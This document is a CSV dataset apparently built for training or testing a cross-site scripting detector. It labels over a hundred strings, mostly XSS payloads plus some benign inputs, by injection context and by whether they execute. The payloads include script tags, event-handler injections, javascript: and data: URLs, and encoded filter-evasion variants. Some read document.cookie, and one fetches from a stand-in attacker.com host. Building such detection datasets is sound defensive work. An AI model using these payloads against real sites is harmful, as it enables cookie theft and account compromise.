payload,context,exec,combined
""" onpointerover=alert(1) """,html_attribute,1,"CONTEXT_html_attribute "" onpointerover=alert(1) """
""" onkeyup=alert(1) """,html_tag,0,"CONTEXT_html_tag "" onkeyup=alert(1) """
<script>alert(document.cookie)</script>,html_tag,1,CONTEXT_html_tag <script>alert(document.cookie)</script>
%3Ciframe%3E,html_text,0,CONTEXT_html_text %3Ciframe%3E
""" oninput=alert(1) """,html_attribute,1,"CONTEXT_html_attribute "" oninput=alert(1) """
<source onerror=alert(1)>,url_href,0,CONTEXT_url_href <source onerror=alert(1)>
"data:text/html,<script>alert(1)</script>",url_navigation,1,"CONTEXT_url_navigation data:text/html,<script>alert(1)</script>"
<ScRiPt>alert(1)</ScRiPt>,html_tag,1,CONTEXT_html_tag <ScRiPt>alert(1)</ScRiPt>
"""><svg/onload=alert(1)>",html_attribute,1,"CONTEXT_html_attribute ""><svg/onload=alert(1)>"
""";alert(document.title);//",script_block,1,"CONTEXT_script_block "";alert(document.title);//"
><svg/onload=alert(1)>,html_text,0,CONTEXT_html_text ><svg/onload=alert(1)>
javascript:prompt(1),url_href,1,CONTEXT_url_href javascript:prompt(1)
"<a href=""javascript:"">",html_text,0,"CONTEXT_html_text <a href=""javascript:"">"
</pre><details open ontoggle=alert(1)>,script_block,0,CONTEXT_script_block </pre><details open ontoggle=alert(1)>
<img src=x onerror=alert(document.URL)>,html_tag,1,CONTEXT_html_tag <img src=x onerror=alert(document.URL)>
</pre><svg/onload=alert`1`>,url_href,0,CONTEXT_url_href </pre><svg/onload=alert`1`>
<script>fetch('http://attacker.com')</script>,html_tag,1,CONTEXT_html_tag <script>fetch('http://attacker.com')</script>
<img src=x>,script_block,0,CONTEXT_script_block <img src=x>
""";alert(window.origin);//",script_block,1,"CONTEXT_script_block "";alert(window.origin);//"
""";prompt(1);//",script_block,1,"CONTEXT_script_block "";prompt(1);//"
</pre><marquee onstart=alert(1)>,html_text,0,CONTEXT_html_text </pre><marquee onstart=alert(1)>
"<iframe srcdoc=""<script>alert(1)</script>"">",url_href,0,"CONTEXT_url_href <iframe srcdoc=""<script>alert(1)</script>"">"
</pre><svg/onload=alert`1`>,html_tag,1,CONTEXT_html_tag </pre><svg/onload=alert`1`>
<svg>,html_text,0,CONTEXT_html_text <svg>
<scr<script>ipt>alert(1)</scr</script>ipt>,html_text,0,CONTEXT_html_text <scr<script>ipt>alert(1)</scr</script>ipt>
javascript:prompt`1`,url_href,1,CONTEXT_url_href javascript:prompt`1`
</textarea><svg/onload=alert(1)>,url_href,0,CONTEXT_url_href </textarea><svg/onload=alert(1)>
<img src=x onerror=prompt(1)>,html_tag,1,CONTEXT_html_tag <img src=x onerror=prompt(1)>
""" onclick=alert(1)",html_attribute,1,"CONTEXT_html_attribute "" onclick=alert(1)"
;alert(navigator.userAgent);//,url_href,0,CONTEXT_url_href ;alert(navigator.userAgent);//
;alert(1);//,html_text,0,CONTEXT_html_text ;alert(1);//
<meter onmouseover=alert(1)>,url_href,0,CONTEXT_url_href <meter onmouseover=alert(1)>
<svg/onload=alert(1)>,html_tag,1,CONTEXT_html_tag <svg/onload=alert(1)>
""" onauxclick=alert(1) """,html_attribute,1,"CONTEXT_html_attribute "" onauxclick=alert(1) """
javascript:alert(document.domain),url_href,1,CONTEXT_url_href javascript:alert(document.domain)
"<iframe srcdoc=""<script>alert(1)</script>"">",html_tag,1,"CONTEXT_html_tag <iframe srcdoc=""<script>alert(1)</script>"">"
""";alert(document.cookie);//",html_tag,0,"CONTEXT_html_tag "";alert(document.cookie);//"
""" onmouseenter=alert(1) """,html_attribute,1,"CONTEXT_html_attribute "" onmouseenter=alert(1) """
"data:text/html,<script>prompt(1)</script>",html_text,0,"CONTEXT_html_text data:text/html,<script>prompt(1)</script>"
<i>text</i>,html_text,0,CONTEXT_html_text <i>text</i>
category=electronics,html_text,0,CONTEXT_html_text category=electronics
""";confirm(1);//",script_block,1,"CONTEXT_script_block "";confirm(1);//"
&#x3C;script&#x3E;,html_tag,0,CONTEXT_html_tag &#x3C;script&#x3E;
title=hello,html_text,0,CONTEXT_html_text title=hello
<iframe src=javascript:alert(1)>,url_href,0,CONTEXT_url_href <iframe src=javascript:alert(1)>
<svg/onload=confirm`1`>,html_tag,1,CONTEXT_html_tag <svg/onload=confirm`1`>
<video src=x onerror=alert(1)>,html_tag,1,CONTEXT_html_tag <video src=x onerror=alert(1)>
src=image,html_tag,0,CONTEXT_html_tag src=image
name=user,html_text,0,CONTEXT_html_text name=user
<script>alert(1),html_attribute,0,CONTEXT_html_attribute <script>alert(1)
onblur=alert(1),html_text,0,CONTEXT_html_text onblur=alert(1)
<img src=x onerror=alert&#40;1&#41;>,html_tag,1,CONTEXT_html_tag <img src=x onerror=alert&#40;1&#41;>
""" onmouseover=alert(1)",html_attribute,1,"CONTEXT_html_attribute "" onmouseover=alert(1)"
</randomtag>,html_text,0,CONTEXT_html_text </randomtag>
""" onkeyup=alert(1) """,html_attribute,1,"CONTEXT_html_attribute "" onkeyup=alert(1) """
><svg/onload=alert(1)>,script_block,0,CONTEXT_script_block ><svg/onload=alert(1)>
<svg/onload=alert`XSS`>,html_tag,1,CONTEXT_html_tag <svg/onload=alert`XSS`>
javascript:alert(1),url_href,1,CONTEXT_url_href javascript:alert(1)
"data:text/html,<img src=x onerror=alert(1)>",url_navigation,1,"CONTEXT_url_navigation data:text/html,<img src=x onerror=alert(1)>"
<source onerror=alert(1)>,html_tag,1,CONTEXT_html_tag <source onerror=alert(1)>
<script>alert(1),html_tag,0,CONTEXT_html_tag <script>alert(1)
""";alert(location);//",html_text,0,"CONTEXT_html_text "";alert(location);//"
admin,html_text,0,CONTEXT_html_text admin
><svg/onload=alert(1)>,url_href,0,CONTEXT_url_href ><svg/onload=alert(1)>
"data:text/html,<script>prompt(1)</script>",url_navigation,1,"CONTEXT_url_navigation data:text/html,<script>prompt(1)</script>"
""";alert(document.cookie);//",script_block,1,"CONTEXT_script_block "";alert(document.cookie);//"
"data:text/html,<script>alert(document.cookie)</script>",url_navigation,1,"CONTEXT_url_navigation data:text/html,<script>alert(document.cookie)</script>"
javascript:prompt(1),url_navigation,1,CONTEXT_url_navigation javascript:prompt(1)
javascript:alert(String.fromCharCode(49)),url_href,1,CONTEXT_url_href javascript:alert(String.fromCharCode(49))
<img src=x onerror=alert(1)//>,html_tag,1,CONTEXT_html_tag <img src=x onerror=alert(1)//>
""" onblur=alert(1) """,html_attribute,1,"CONTEXT_html_attribute "" onblur=alert(1) """
<script>alert</script>,html_text,0,CONTEXT_html_text <script>alert</script>
<alert>,html_text,0,CONTEXT_html_text <alert>
<<>>,html_text,0,CONTEXT_html_text <<>>
javascript:prompt(1),script_block,0,CONTEXT_script_block javascript:prompt(1)
javascript:confirm(1),html_attribute,0,CONTEXT_html_attribute javascript:confirm(1)
<IMG SRC=x ONERROR=alert(1)>,html_tag,1,CONTEXT_html_tag <IMG SRC=x ONERROR=alert(1)>
""" onmouseover=alert(1) """,html_attribute,1,"CONTEXT_html_attribute "" onmouseover=alert(1) """
</script><svg/onload=alert(1)>,script_block,1,CONTEXT_script_block </script><svg/onload=alert(1)>
javascript:alert(navigator.userAgent),url_href,1,CONTEXT_url_href javascript:alert(navigator.userAgent)
javascript:confirm(1),url_navigation,1,CONTEXT_url_navigation javascript:confirm(1)
<script>alert(String.fromCharCode(49))</script>,html_tag,1,CONTEXT_html_tag <script>alert(String.fromCharCode(49))</script>
javascript:prompt(1),html_attribute,0,CONTEXT_html_attribute javascript:prompt(1)
<svg><script>prompt(1)</script>,html_tag,1,CONTEXT_html_tag <svg><script>prompt(1)</script>
"<iframe srcdoc=""<img src=x onerror=alert(1)>"">",html_tag,1,"CONTEXT_html_tag <iframe srcdoc=""<img src=x onerror=alert(1)>"">"
<iframe>,html_text,0,CONTEXT_html_text <iframe>
<svg/onload=alert(String.fromCharCode(49))>,url_href,0,CONTEXT_url_href <svg/onload=alert(String.fromCharCode(49))>
<img src=x onerror=alert(window.origin)>,html_tag,1,CONTEXT_html_tag <img src=x onerror=alert(window.origin)>
<script>\u0061lert(1)</script>,html_tag,1,CONTEXT_html_tag <script>\u0061lert(1)</script>
<img src=x onerror=alert(navigator.userAgent)>,html_tag,1,CONTEXT_html_tag <img src=x onerror=alert(navigator.userAgent)>
{test},html_text,0,CONTEXT_html_text {test}
""" oninput=alert(1) """,script_block,0,"CONTEXT_script_block "" oninput=alert(1) """
confirm(1),script_block,0,CONTEXT_script_block confirm(1)
;alert(history.length);//,url_href,0,CONTEXT_url_href ;alert(history.length);//
</pre><body onload=alert(1)>,html_tag,1,CONTEXT_html_tag </pre><body onload=alert(1)>
<div>content</div>,html_text,0,CONTEXT_html_text <div>content</div>
""" onwheel=alert(1) """,html_attribute,1,"CONTEXT_html_attribute "" onwheel=alert(1) """
<img src=x onerror=alert(1)//,html_tag,1,CONTEXT_html_tag <img src=x onerror=alert(1)//
<script>prompt(1)</script>,html_tag,1,CONTEXT_html_tag <script>prompt(1)</script>
"data:text/html,<svg/onload=alert(1)>",url_navigation,1,"CONTEXT_url_navigation data:text/html,<svg/onload=alert(1)>"
hello,html_text,0,CONTEXT_html_text hello
javascript:alert(history.length),url_href,1,CONTEXT_url_href javascript:alert(history.length)
AT&T,html_text,0,CONTEXT_html_text AT&T
"<iframe srcdoc=""<script>alert(1)</script>"">",html_attribute,0,"CONTEXT_html_attribute <iframe srcdoc=""<script>alert(1)</script>"">"
""" onfocus=alert(1) autofocus """,url_href,0,"CONTEXT_url_href "" onfocus=alert(1) autofocus """
;alert(document.domain);//,html_attribute,0,CONTEXT_html_attribute ;alert(document.domain);//
""";alert(history.length);//",script_block,1,"CONTEXT_script_block "";alert(history.length);//"
&#60;script&#62;,html_tag,0,CONTEXT_html_tag &#60;script&#62;
